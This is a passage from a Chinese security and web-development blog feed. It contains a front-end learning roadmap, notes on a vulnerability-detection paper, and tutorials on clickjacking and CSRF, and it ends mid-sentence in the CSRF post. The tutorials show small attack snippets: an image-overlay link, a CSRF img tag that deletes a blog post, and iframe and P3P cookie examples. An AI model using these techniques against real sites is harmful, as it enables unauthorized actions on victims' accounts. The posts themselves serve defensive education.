      
        <content type="html"><![CDATA[<p>本文主要介绍前端开发的技术架构和学习路线</p><h1 id="技术架构"><a class="markdownIt-Anchor" href="#技术架构"></a> 技术架构</h1><h2 id="基础技术"><a class="markdownIt-Anchor" href="#基础技术"></a> 基础技术</h2><p>首先可以</p><ul><li><p><strong>HTML (HyperText Markup Language)</strong>: 用于构建网页的基本结构。HTML<u>定义了网页的内容</u>及其组织方式。</p><blockquote><p>HTML5 是下一代的HTML，简而言之就是 HTML 的升级版。它抛弃了 HTML 中一些老旧的特性，并新增了许多新特性用来帮助用户更好的开发页面。<u>一般优先学习HTML即可</u></p></blockquote></li><li><p><strong>CSS (Cascading Style Sheets)</strong>: 用于<u>控制网页的外观和布局</u>。CSS可以设置颜色、字体、排版、间距等视觉效果。</p></li><li><p><strong>JavaScript</strong>: 一种脚本语言，用于实现网页的动态效果和交互功能。JavaScript可以更新内容、验证表单、创建图表和动画等。JavaScript 控<u>制了网页的行为</u></p></li></ul><h2 id="开发框架和库"><a class="markdownIt-Anchor" href="#开发框架和库"></a> 开发框架和库</h2><p>开发框架和库提供了大量现成的功能和组件，开发者可以直接使用这些功能而不必从头编写。这大大减少了重复劳动，提高了开发效率。</p><ol><li><p><strong>前端框架</strong></p><p>使用框架通常意味着按照框架的约定来组织和编写代码（将一些底层的代码以更简洁的语言封装好），遵循框架的开发模式。可以快速构建前端应用的整体结构和工具，通常包括路由、状态管理等。</p><ul><li><strong>React</strong>: 由Facebook开发的一个用于构建用户界面的JavaScript库。它使用组件化的开发方式，可以实现高效的UI更新和管理。</li><li><strong>Angular</strong>: 由Google开发的一个前端框架。Angular是一个完整的框架，提供了双向数据绑定、依赖注入和模块化开发等功能。</li><li><strong>Vue.js</strong>: 由Evan You开发的一个渐进式JavaScript框架。Vue.js灵活易用，适合构建中小型项目，也可以通过插件扩展用于大型项目。</li></ul></li><li><p><strong>前端库</strong></p><p>用于简化操作。更为灵活，开发者可以在任何需要的地方调用库的功能，库的使用方式通常不对项目结构产生影响。</p><ul><li><strong>jQuery</strong>: 一个快速、小巧的JavaScript库，简化了HTML文档遍历、事件处理、动画和Ajax交互。</li><li><strong>D3.js</strong>: 一个基于数据驱动文档（Data-Driven Documents）的JavaScript库，用于制作动态和交互式数据可视化。</li></ul><blockquote><p><strong>框架和库的区别</strong></p><ul><li>库是一组预先写好的代码集合，提供了开发者可以调用的函数和方法。通常解决特定的问题或提供特定的功能，比如处理HTTP请求、操作DOM、数据处理等。</li><li>框架是一组集成的工具和代码库，提供了一个整体的应用结构和开发模式。通常用于构建特定类型的应用，如Web应用、移动应用等。框架通常提供了一套开发规范和约定，开发者需要遵循这些规范进行开发。</li></ul><p>如jQuery仅仅只是简化了操作DOM等的代码，使得代码更加简洁易读。而react框架进行组件化开发，可以快速构建web应用。</p></blockquote></li><li><p><strong>UI组件库</strong></p><p>可重用的 UI 组件，帮助开发者快速构建界面，但不包含前端应用的整体结构。</p><ul><li><strong>Ant Design</strong>：一个React UI组件库，它提供了一套完整的UI组件和设计规范，帮助开发者快速构建企业级中后台应用。Ant Design与React结合使用，使得开发者可以在React应用中方便地使用这些预定义的UI组件，从而提高开发效率和一致性。</li><li><strong>Bootstrap</strong>：一个流行的CSS框架，包含丰富的预制组件和样式。</li></ul></li></ol><h2 id="构建工具和模块化"><a class="markdownIt-Anchor" href="#构建工具和模块化"></a> 构建工具和模块化</h2><p>构建工具用于自动化处理项目中重复性任务的工具，它们可以帮助开发者提高工作效率，确保代码质量，优化项目性能。</p><p>模块化是一种将代码组织成独立、可复用模块的开发方法。它可以提高代码的可维护性、可读性和复用性。</p><ol><li><strong>构建工具</strong><ul><li><strong>Webpack</strong>: 一个静态模块打包器，可以将多个模块和资源打包成一个或多个bundle文件，支持代码拆分、热更新等功能。</li><li><strong>Gulp</strong>: 一个基于流的自动化构建工具，可以自动化处理项目中的重复性任务，如文件压缩、CSS预处理、代码检查等。</li></ul></li><li><strong>模块化</strong><ul><li><strong>ES6 Modules</strong>: ES6引入了模块化语法，可以使用<code>import</code>和<code>export</code>关键字在文件之间共享代码。</li><li><strong>CommonJS</strong>: Node.js使用的模块系统，使用<code>require</code>和<code>module.exports</code>来导入和导出模块。</li></ul></li></ol><h2 id="前端开发环境和工具"><a class="markdownIt-Anchor" href="#前端开发环境和工具"></a> 前端开发环境和工具</h2><ol><li><p><strong>集成开发环境 (IDE) 和代码编辑器</strong></p><ul><li><p><strong>Visual Studio Code (VSCode)</strong>: 目前最流行的代码编辑器之一，提供丰富的插件生态和强大的调试功能。</p><p>插件选择：<a href="https://blog.csdn.net/2303_82176667/article/details/137193809">https://blog.csdn.net/2303_82176667/article/details/137193809</a></p><p>插件：</p><ul><li><p>Live Server：可以在 VSCode 中打开 HTML、CSS、JavaScript 文件，并通过点击工具栏上的“Go Live”按钮，启动一个本地服务器来预览网页。每当你保存代码时，服务器会自动刷新页面，以便你可以立即查看修改后的效果。</p></li><li><p>JavaScript Code Snippets插件：</p></li><li><p><strong>Live Preview</strong>：在编辑窗口右击鼠标，选择 <code>Show Preview</code> 选项，可以实时预览编写的代码</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710154126545.png" alt="image-20240710154126545" /></p></li></ul></li><li><p><strong>WebStorm</strong>: 一个商业的JavaScript开发工具，提供强大的代码智能提示和调试功能。</p></li></ul></li><li><p><strong>版本控制</strong></p><ul><li><strong>Git</strong>: 一个分布式版本控制系统，广泛用于跟踪代码变更和协作开发。常用平台有GitHub、GitLab等。</li></ul></li><li><p><strong>包管理器</strong></p><ul><li><strong>npm (Node Package Manager)</strong>: Node.js的包管理器，用于管理项目中的依赖包。</li><li><strong>Yarn</strong>: 一个快速、安全且可靠的依赖管理工具，兼容npm包。</li></ul></li></ol><h2 id="前端开发最佳实践"><a class="markdownIt-Anchor" href="#前端开发最佳实践"></a> 前端开发最佳实践</h2><ol><li><strong>响应式设计</strong><ul><li>使用媒体查询和灵活的网格布局，使网页能够适应不同设备的屏幕尺寸。</li></ul></li><li><strong>性能优化</strong><ul><li>通过代码分割、懒加载、压缩资源等方式，提高网页的加载速度和性能。</li></ul></li><li><strong>跨浏览器兼容性</strong><ul><li>确保网页在不同浏览器中都能正常显示和运行，使用工具如BrowserStack进行测试。</li></ul></li><li><strong>可维护性</strong><ul><li>遵循代码规范，使用Lint工具进行代码检查，编写清晰、易读和可维护的代码。</li></ul></li><li><strong>安全性</strong><ul><li>防止XSS、CSRF等常见安全漏洞，使用安全的编程实践和工具进行代码审计。</li></ul></li></ol><h1 id="学习路线"><a class="markdownIt-Anchor" href="#学习路线"></a> 学习路线</h1><p>参考：</p><ul><li>b站视频 <a href="https://www.bilibili.com/video/BV1ZZ4y1H7rU">【干货】前端学习路线分享！写了个网站帮助你学习前端！</a></li><li>博客：<a href="https://www.arryblog.com/guide/web-learning-route.html#html-html5">2024 最新 Web 前端开发学习路线，主要技术栈</a></li></ul><ol><li><p>首先学习html + CSS + javascript ：</p><p>HTML和CSS直接在菜鸟教程网上快速学习</p><ul><li><p>HTML：学习一些常用标签的基本使用 <a href="https://www.runoob.com/html/html-tutorial.html">HTML 教程|菜鸟教程</a></p></li><li><p>CSS：学习基本的CSS属性、如何使用CSS来灵活布局节点 <a href="https://www.runoob.com/css/css-tutorial.html">CSS 教程|菜鸟教程</a></p></li></ul><p>然后学习JavaScript</p><ul><li>视频教程：<a href="https://www.bilibili.com/video/BV1Y84y1L7Nn">黑马pink JavaScript前端课程</a></li></ul></li></ol><ul><li>推荐书籍：<ul><li>javascript高级程序设计</li><li>javascript dom编程艺术</li></ul></li></ul><ol start="2"><li><p>然后学习前端框架：</p><p>选择 react 和 vue其中之一即可</p><ul><li>react</li><li>vue</li></ul></li></ol><h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><ul><li><p><strong>页面渲染（Page Rendering）</strong>：将网页内容从原始代码转换为用户可以在浏览器中看到和交互的可视化界面的过程。主要包括关键步骤：解析HTML、解析CSS、布局、处理JS等</p></li><li><p><strong>脚手架（Scaffolding）</strong>：前端脚手架是一种工具或框架，用于快速搭建项目的基础结构，帮助开发者迅速启动一个新项目。脚手架通常包括预设的项目目录结构、基本配置文件、常用的工具和库集成，以及一些示例代码。它们旨在减少项目初期的繁琐设置工作，使开发者可以专注于业务逻辑和功能实现。</p></li><li><p><strong>路由（route）</strong>：Web 应用程序中用于管理和处理不同 URL 路径及其对应的组件或页面的机制。在前端框架如 React、Angular、Vue.js 中，路由系统负责根据当前 URL 显示相应的组件或页面，从而实现单页面应用（SPA）的导航和页面切换。</p><ul><li>子路由：子路由是指在一个主路由路径下定义的嵌套路由。它们<strong>允许你在一个大的路由结构中细分出更小的路由层次</strong>，使得应用程序的页面结构更加清晰和组织有序。通过子路由，可以为某些路径添加<strong>公共布局或功能</strong>，而不需要在每个路由中重复这些设置。</li></ul></li><li><p><strong>打包（bundler）</strong>：在 Web 开发中，打包工具（如 Webpack，一个用于现代 JavaScript 应用程序的静态模块打包工具）通常会对 JavaScript、CSS、HTML、图片等资源进行处理，将它们合并、压缩和优化，生成适合在生产环境中使用的文件。</p></li><li><p><strong>异步请求与同步请求</strong>：</p><ul><li>异步请求：指向服务器发送请求并等待响应的操作，这些操作不会阻塞代码的执行。具体来说，当发出一个请求时，浏览器不会等待请求完成，而是继续执行后续代码。一旦请求完成，会通过回调函数或 Promise 的方式处理响应结果。</li><li>同步请求：代码执行会被阻塞，直到请求完成并收到响应后，才会继续执行后续代码。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『论文笔记』Vulnerability Detection with Graph Simplification and Enhanced Graph Representation Learning</title>
      <link href="/posts/3fa7.html"/>
      <url>/posts/3fa7.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文标题：Vulnerability Detection with Graph Simplification and Enhanced Graph Representation Learning</em><br /><em>原文作者：Xin-Cheng Wen; Yupan Chen; Cuiyun Gao; Cuiyun Gao; Jie M. Zhang</em><br /><em>发表期刊：International Conference on Software Engineering (ICSE) 2023</em><br /><em>原文链接：<a href="https://arxiv.org/pdf/2302.04675">https://arxiv.org/pdf/2302.04675</a></em><br /><em>主题类型：源代码漏洞检测，深度学习</em><br /><em>笔记作者：isoda</em><br /><em>主编：黄诚@安全学术圈</em></p></blockquote><h1 id="1-研究介绍"><a class="markdownIt-Anchor" href="#1-研究介绍"></a> 1、研究介绍</h1><p>图神经网络（GNN）已经被证明了在学习源代码的图表示方面的有效性，并且经常应用于现有的基于深度学习的漏洞检测方法中。然而，GNN仍然受到以下事实限制：</p><ul><li>因为专注于通过邻域聚合来学习节点的局部特征，GNN <strong>很难处理代码结构图中长距离节点之间的连接依赖</strong>，无法捕获图的全局信息。</li><li><strong>不能很好地利用代码结构图中的多种边类型</strong>（如表示数据流和控制流的边）。</li></ul><p>为了缓解这一问题，本文提出了一种新的漏洞检测框架AMPLE，主要包括图简化和增强的图表示学习两部分：<strong>1）图简化</strong>。通过缩小代码结构图的节点大小来减少节点之间的距离，使得GNN更容易处理长距离节点间的依赖关系； <strong>2）增强图表示学习</strong>。通过一个边感知图卷积网络模块将异构边信息融合到节点表示中，提高节点表示的准确性。并通过一个核尺度表示模块更好捕获远距离节点之间的关系，提升全局信息的学习效果。实验结果表明，AMPLE在准确性和F1分数方面显著优于现有方法，证明了其在捕捉代码图全局信息和提高漏洞检测效果方面的有效性。</p><h1 id="2-主要思路"><a class="markdownIt-Anchor" href="#2-主要思路"></a> 2、主要思路</h1><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611110609958.png" alt="image-20240611110609958" /></p><p>AMPLE整体的流程图如上所示，框架总体来说分为图简化和增强图表示学习两个部分：首先从源代码中提取代码结构图，输入图简化模块，进行基于节点类型和变量类型的图简化；将简化完成后的代码结构图输入增强表示学习模块，通过边感知图卷积网络提取整个图的边增强节点表示矩阵，再通过双尺度卷积核来学习图的全局信息，最后通过两个全连接层和一个softmax函数进行二分类，判断源代码中是否存在漏洞。</p><h2 id="21-图简化"><a class="markdownIt-Anchor" href="#21-图简化"></a> 2.1、图简化</h2><p>图简化部分旨在压缩代码结构图中的重复信息，从而缩小图的大小并减少节点之间的距离。该部分主要包括两个步骤：基于节点类型的图简化和基于节点变量的图简化。</p><ul><li><p><strong>基于节点类型的图简化</strong>：通过解析原则和手动检查代码结构图，作者提出了七条合并规则，如表1所示。对于每一对符合合并规则的相邻节点，删除子节点，因为其信息是父节点的细化，并且可以在后续节点中反映。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611113827591.png" alt="image-20240611113827591" /></p><p>例如，下图中 <code>char *first = malloc(10)</code>  语句是一个标识符声明语句，红色虚线边框的节点就是作为它的子节点可以按照表中的规则2合并到其父节点。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611162758364.png" alt="image-20240611162758364" /></p></li><li><p><strong>基于变量的图简化</strong>：将代码结构图中具有相同变量的叶子节点合并为一个节点，使得合并后的节点有多个父节点，可以同时聚合来自不同语句的信息。增强了节点表示的丰富性和准确性的同时并不会改变其父子层次信息。</p><p>例如下图中，“char str[15]”和“scanf(”%s”,str);”两个语句的子节点中都存在变量“str”，从而可以合并两个“str”叶节点，“scanf(”%s”,str);”将新的AST边连接合并后的“str”叶节点。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611163124981.png" alt="image-20240611163124981" /></p></li></ul><h2 id="22-增强图表示学习"><a class="markdownIt-Anchor" href="#22-增强图表示学习"></a> 2.2、增强图表示学习</h2><p>该部分主要包括两个模块：边感知图卷积网络模块和核尺度表示模块。</p><ul><li><p><strong>边感知图卷积网络</strong>（edge-aware graph convolutional network，EA-GCN）模块：为了利用简化图中的不同边类型（如抽象语法树AST和控制流图CFG）来增强节点表示，作者提出了EA-GCN。</p><p>首先对代码结构图中所有节点的嵌入向量进行初始化。将节点中的代码标记为token序列，基于word2vec初始化每个token的嵌入，计算节点中所有token嵌入的平均值，作为整个节点的初始嵌入。</p><p>然后在消息传递过程中，分别对不同类型的边加权计算节点向量。进一步引入多头注意力机制整合图中的异构边信息，计算并聚合节点边的注意力分数，以增强节点表示。 最终可以计算得到整个图的<strong>边增强节点表示矩阵</strong>。</p></li><li><p><strong>核尺度表示模块</strong>：核尺度表示模块旨在通过显式捕捉远距离节点之间的关系来学习图的全局信息。</p><p>该模块设计了双尺度卷积核，其中大卷积核关注于远距离节点之间的关系，小卷积核关注于邻居节点之间的关系，两个卷积核并行进行卷积操作。两个分支的卷积结果经过批归一化（BN）层处理后相加，将最终的结果通过两个全连接层和一个softmax函数进行二分类，判断源代码中是否存在漏洞。</p></li></ul><h2 id="23-实验设置"><a class="markdownIt-Anchor" href="#23-实验设置"></a> 2.3、实验设置</h2><p>使用了三个广泛研究的开源C/C++项目基准数据集</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611152606586.png" alt="image-20240611152606586" /></p><p>作者将AMPLE与三种基于图和三种基于令牌的SOTA漏洞检测方法分别在选用的所有数据集上进行了比较，可以看到AMPLE基本是全面优于基线模型的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611152752272.png" alt="image-20240611152752272" /></p><h1 id="3-个人思考"><a class="markdownIt-Anchor" href="#3-个人思考"></a> 3、个人思考</h1><ul><li>AMPLE围绕基于GNN进行漏洞检测的两大问题展开：1）难以处理代码结构图中长距离节点之间的连接依赖。2）不能很好地利用代码结构图中的多种边类型。作者分别设计了核尺度表示模块和边感知图卷积网络模块来解决这两大问题，模型整体在F1方面相比SOTA模型有显著的提高，论文思路条理十分清晰。</li><li>尽管图简化方法减少了节点数量，但增强图表示学习模块（EA-GCN和核尺度表示模块）的<strong>计算复杂度</strong>仍然较高，特别是在处理大型代码库时，可能面临计算资源和时间的挑战。</li><li>虽然在基准数据集上表现优异，但这些基准数据集均为C/C++数据集，<strong>在其他类型编程语言上的泛化能力</strong>仍需进一步验证和优化。</li><li>论文中的方法通过二分类来判断代码片段是否存在漏洞，检测粒度在函数级别和模块/类级别，<strong>不能实现漏洞的精确定位</strong>。在实际应用中，还需要结合其他技术手段来实现漏洞的精确定位和修复。未来工作可以考虑如何将此方法与精确定位技术结合，提供更全面的漏洞检测和修复方案。</li></ul><h1 id="论文团队信息"><a class="markdownIt-Anchor" href="#论文团队信息"></a> 论文团队信息</h1><p>通讯作者高翠芸，哈尔滨工业大学（深圳）计算机学院终身副教授、博导，学校青年拔尖人才，香港中文大学（CUHK）博士，深圳市“海外高层次人才”，鹏城实验室双聘学者，获得第九届中国科协青年人才托举工程项目。</p><ul><li>主要研究方向：人工智能+软件工程，大语言模型；漏洞检测</li><li>70+篇论文发表在程序分析和软件工程领域的顶级会议和期刊上，如TSE、TOSEM、ICSE、 ISSTA、ASE等。</li><li>个人主页：<a href="https://cuiyungao.github.io/">https://cuiyungao.github.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 论文笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源代码漏洞检测 </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『点击劫持』ClickJacking</title>
      <link href="/posts/547c.html"/>
      <url>/posts/547c.html</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>点击劫持是一种视觉上的欺骗手段。</p><p>黑客使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，<br />此时用户将在不知情的情况下点击透明的iframe页面。</p><p>通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上，从而使用户完成不知情的操作。</p><h1 id="攻击类型"><a class="markdownIt-Anchor" href="#攻击类型"></a> 攻击类型</h1><h2 id="图片覆盖攻击"><a class="markdownIt-Anchor" href="#图片覆盖攻击"></a> 图片覆盖攻击</h2><p>图片覆盖攻击，Cross Site Image Overlaying攻击，简称XSIO。</p><p>例如，以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://disenchant.ch&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://disenchant.ch/powered.jpg</span></span></span><br><span class="line"><span class="tag"><span class="attr">style</span>=<span class="string">position:absolute;right:320px;top:90px;/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过调整图片的style使得图片能够覆盖在黑客所指定的任意网页位置。</p><p>如果用户打算点击网页的的logo，而此logo已经被黑客的图片所覆盖，那么点击后就会链接到<code>http: //disenchant. ch</code>。如果 <code>http: //disenchant. ch</code> 是钓鱼网站，那用户很可能会上当。</p><h2 id="拖拽劫持与数据窃取"><a class="markdownIt-Anchor" href="#拖拽劫持与数据窃取"></a> 拖拽劫持与数据窃取</h2><ol><li><p><strong>背景</strong></p><p>很多浏览器都开始支持Drag &amp; Drop 的API。对于用户来说，拖拽使他们的操作更加简单。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另外一个窗口，因此<strong>拖拽是不受同源策略限制的</strong>。</p></li><li><p><strong>攻击思路</strong></p><p>拖拽劫持的思路是诱使用户从隐藏的不可见iframe中“拖拽”出黑客希望得到的数据，<br />然后放到黑客能控制的另外一个页面中，从而窃取数据。</p><blockquote><p>所以拖拽部分为iframe中黑客想要的数据，即正常的页面。</p><p>放置部分为黑客控制页面，黑客可以从这里获取这部分数据</p></blockquote></li><li><p><strong>例子</strong></p><p>黑客制作了一个网页小游戏，将球拖拽到小海豹的头顶上</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607173659420.png" alt="image-20240607173659420" /></p><p>小球和小海豹的头顶都有隐藏的iframe。</p><p>黑客利用event.dataTransfer.getData(‘Text’)来获取“drag”到的数据。当用户拖拽小球时，实际上是选中了隐藏的iframe里的数据；在放下小球时，把数据也放在了隐藏的textarea中，从而完成一次数据窃取的过程。</p></li></ol><h2 id="触屏劫持"><a class="markdownIt-Anchor" href="#触屏劫持"></a> 触屏劫持</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607174131863.png" alt="image-20240607174131863" /></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607174143674.png" alt="image-20240607174143674" /></p><h1 id="点击劫持防御"><a class="markdownIt-Anchor" href="#点击劫持防御"></a> 点击劫持防御</h1><p>一般是通过禁止跨域的iframe来防范</p><h2 id="frame-busting"><a class="markdownIt-Anchor" href="#frame-busting"></a> frame busting</h2><p>通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫frame busting。</p><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( top.<span class="property">location</span> != location ) &#123;</span><br><span class="line">    top.<span class="property">location</span> = self.<span class="property">location</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于frame busting是用JS写的，控制能力并不是特别强，因此有许多方法可以绕过它。</p><p>例，对parent.location的frame busting，就可以采用嵌套多个iframe的方法绕过。</p><h2 id="x-frame-options"><a class="markdownIt-Anchor" href="#x-frame-options"></a> X-Frame-Options</h2><p>因为frame busting存在被绕过的可能，一般使用HTTP头——X-Frame-Options来进行防御。</p><p>它有三个可选的值：</p><ul><li>DENY：浏览器会拒绝当前页面加载任何frame页面；</li><li>SAMEORIGIN：frame页面的地址只能为同源域名下的页面；</li><li>ALLOW-FROM origin：允许frame加载的页面地址；</li></ul><p>一些浏览器拓展，如Firefox的NoScript扩展也可以防御。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> 点击劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站点请求伪造』CSRF攻击</title>
      <link href="/posts/3f8b.html"/>
      <url>/posts/3f8b.html</url>
      
        <content type="html"><![CDATA[<h1 id="定义与原理"><a class="markdownIt-Anchor" href="#定义与原理"></a> 定义与原理</h1><ul><li><p><strong>定义</strong></p><p>CSRF（Cross Site Request Forgery，跨站点请求伪造）</p><p><strong>通过伪装成受信任用户请求受信任的网站</strong>。对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等</p></li><li><p><strong>例子</strong></p><p>假设请求这个url可以删除掉编号为156713012的搜狐博客文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sohu.com/mange/entry.do?m=delete&amp;id=156713012</span><br></pre></td></tr></table></figure><p>假设这个url同时还存在csrf漏洞，我们可以尝试利用这个漏洞，删除掉这篇文章。</p><p>攻击者可以首先在自己的域构造一个页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/csrf.html</span><br></pre></td></tr></table></figure><p>其中包含一个img标签，指向上面的删除博客文章的链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot; /&gt;</span><br></pre></td></tr></table></figure><p>攻击者可以诱使博主访问自己构造的页面 <code>http://www.a.com/csrf.html</code>，博主看到的是一个无法显示的图片，此时博客文章已经被删除掉了。</p><p>原因就是：博主在访问该页面的时候，图片标签向搜狐服务器发送了一次GET请求，删除了文章。</p></li></ul><h1 id="csrf进阶"><a class="markdownIt-Anchor" href="#csrf进阶"></a> CSRF进阶</h1><h2 id="浏览器的cookie策略"><a class="markdownIt-Anchor" href="#浏览器的cookie策略"></a> 浏览器的Cookie策略</h2><p>一般csrf攻击的目标需要使用cookie</p><ol><li><p><strong>浏览器所持有的Cookie分为两种</strong></p><ul><li><p><strong>Session Cookie（临时Cookie）</strong></p><ul><li>没有指定Expire时间，保存在内存中，所以浏览器关闭后，Session Cookie就失效了。</li><li>浏览网站，若是一个网站设置了Session Cookie，那么在浏览器进程的生命周期内，即使浏览器新打开了Tab页，因为新Tab页在同一个浏览器进程中，Session Cookie也都是有效的，因此<strong>Session Cookie将被发送</strong>。</li></ul></li><li><p><strong>Third-party Cookie（本地Cookie）</strong></p><ul><li>服务器在Set-Cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地</li><li>如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，<strong>某些浏览器会阻止Third-party Cookie的发送</strong>。</li></ul><blockquote><p>例如，攻击者可以在自己的域上（<a href="http://b.com/csrf.html%EF%BC%89%E6%9E%84%E9%80%A0">b.com/csrf.html）构造</a> <code>iframe</code>、<code>&lt;img&gt;</code>、<code>&lt;script&gt;</code> 、<code>&lt;link&gt;</code>等标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://www.a.com&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>抓包可以发现，发送出了 <code>Session Cookie</code></p></blockquote></li></ul></li><li><p><strong>每个浏览器的拦截策略不同</strong></p><ul><li><p>火狐默认允许发送本地Cookie：<a href="http://xn--b-p34bm37c7jvpul.com">用户访问b.com</a>，利用本地直接发送即可成功</p></li><li><p><a id="t1">IE浏览器不允许发送本地Cookie</a>：需要诱使用户在当前浏览器中先访问<code>http://www.a.com</code>，让Session cookie有效，然后再实施CSRF攻击。</p></li></ul></li></ol><h2 id="p3p头的副作用"><a class="markdownIt-Anchor" href="#p3p头的副作用"></a> P3P头的副作用</h2><p>有些CSRF攻击并不需要进行认证，不需要发送cookie</p><ol><li><p><strong>P3P头的定义</strong></p><p>P3P Header（The Platform for Privacy Preferences）是W3C制定的一项关于隐私的标准。</p></li><li><p><strong>P3P头的作用</strong></p><ul><li><p>如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。这种情况下即使是IE的<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>等标签也将不再拦截第三方Cookie的发送。</p></li><li><p>在网站的业务中，P3P头主要用于类似广告等需要跨域访问的页面。但是P3P头设置后，对于Cookie的影响将扩大到整个域中的所有页面，因为Cookie是以域和path为单位的，不符合“最小权限”原则。</p></li><li><p>P3P头只需要由网站设置一次即可，滞后每次请求都会遵循此策略，不需要重复设置。</p></li></ul></li><li><p><strong>例子</strong></p><p><code>http://www.b.com/test.html</code> 代码如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe width=300 height=300 src=&quot;http;//www.a.com/test.php&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>在 <code>http://b.com</code> 中请求 <code>test.html</code>，它的 <code>iframe</code> 会告诉浏览器去跨域请求<code>http://http://www.a.com/test.php</code> 。</p><p><code>http://http://www.a.com/test.php</code> 的代码如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header&#123;&quot;Set-Cookie:test=axis;domain=.a.com;path=/&quot;&#125;; //临时cookie</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>而由于浏览器的同源策略，这里的set-cookie是不会成功的（无论是临时还是本地cookie都不会成功）</p><blockquote><p>注意这里和<a href="#t1">上面的例子</a>的区别：</p><p><strong>同源策略主要限制跨域请求时设置和读取Cookie</strong></p><p>上面的例子是用户主动访问<code>http://www.a.com</code>，这个请求是同源的，因为请求的源（浏览器中当前访问的页面）和目标源（<code>http://www.a.com</code>）是相同的。由于是同源请求，服务器可以成功地设置Session Cookie。浏览器会接受并存储这个Cookie。</p><p>当用户再访问攻击页面（<code>http://www.b.com/csrf.html</code>），这个页面包含一个指向<code>http://www.a.com</code>的<code>&lt;iframe&gt;</code>或其他请求。虽然这个请求是跨域的，但因为Session Cookie已经存在于浏览器中，所以浏览器会自动附带这个Session Cookie发送请求。</p><p>而<strong>这里的例子是跨域请求直接尝试设置Cookie</strong>，所以浏览器会拒绝这个操作，这是同源策略的限制。</p></blockquote><p>但是，在加入P3P头的情况下：P3P头允许跨域访问隐私数据，从而可以跨域set-cookie成功。</p><ul><li><p>正因为P3P头目前在网站的应用中被广泛应用，因此在CSRF的防御中不能依赖于浏览器对第三方Cookie的拦截策略，不能心存侥幸。</p></li><li><p>很多时候，如果测试CSRF时发现<code>&lt;iframe&gt;</code>等标签在IE中居然能发送Cookie，而又找不到原因，那么很可能就是因为P3P头在作怪。</p></li></ul></li></ol><h2 id="get和post"><a class="markdownIt-Anchor" href="#get和post"></a> GET和POST</h2><p>大多数CSRF攻击发起时，使用的HTML标签都是<code>&lt;img&gt;</code> 、<code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 